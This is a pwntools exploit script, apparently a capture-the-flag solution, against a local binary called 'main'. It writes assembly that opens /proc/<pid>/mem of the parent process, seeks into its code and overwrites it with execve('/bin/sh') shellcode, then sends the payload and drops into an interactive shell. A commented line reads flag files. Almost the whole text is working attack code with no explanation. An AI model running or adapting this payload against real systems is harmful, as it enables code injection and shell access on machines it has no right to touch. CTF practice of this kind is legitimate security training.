from pwn import*

context.terminal = 'kitty'

gdbscript = """
set follow-fork-mode child
b *start_timer+224
c
"""

elf = context.binary = ELF('./main')
host, port = 'localhost', 5000
if args.GDB:
    io = gdb.debug('./main', gdbscript=gdbscript)
elif args.REMOTE:
    io = remote(host, port)
else:
    io = process()

shellcode = asm("""
                mov rdi, 0x0068732f6e69622f
                push rdi
                mov rdi, rsp
                xor rsi, rsi
                xor rdx, rdx
                mov rax, 0x3b
                syscall
                """)

shellcode_len = len(shellcode)
length = 0x13fd
payload_padding = 200
payload = asm(f"""
              lea r14, [rip-0x7]
              lea r15, [r15-0x3d30]
              lea rsi, [r15+0x4050]
              mov rsi, [rsi]
              xor rax, rax
              mov eax, esi
              lea rdi, [rsp-0x50]
              add rdi, 10
              mov rcx, rdi

          .convert:
              xor rdx, rdx
              mov rbx, 10
              div rbx
              add dl, '0'
              dec rdi
              mov [rdi], dl
              test rax, rax
              jnz .convert

              sub rdi, 8
              mov rax, 0x2f2f2f636f72702f
              mov [rdi], rax
              mov rax, 0x6d656d2f
              mov [rcx], rax

              mov rax, 0x2
              mov rsi, 0x1
              mov rdx, 0x1b6
              syscall

              mov rdi, rax
              lea rsi, [r15+{length}]
              mov rdx, 0
              mov rax, 8
              mov r10, rdi
              syscall

              mov rdi, r10
              mov rax, 0x1
              lea rsi, [r14+{payload_padding}]
              mov rdx, {shellcode_len}
              syscall

             
          .loop:
              nop
              jmp .loop
              """)

print("len payload: " + str(len(payload)))
print("len shellcode: " + str(len(shellcode)))
payload = payload.ljust(payload_padding, b'\x90')
payload += shellcode

io.recvuntil(b'Input your program size')
pause()
io.sendline(str(len(payload)+1).encode())
io.recvuntil(b'Input your program')
pause()
io.sendline(payload)
#sleep(14)
#io.sendline(b'cat flag*')
io.interactive()
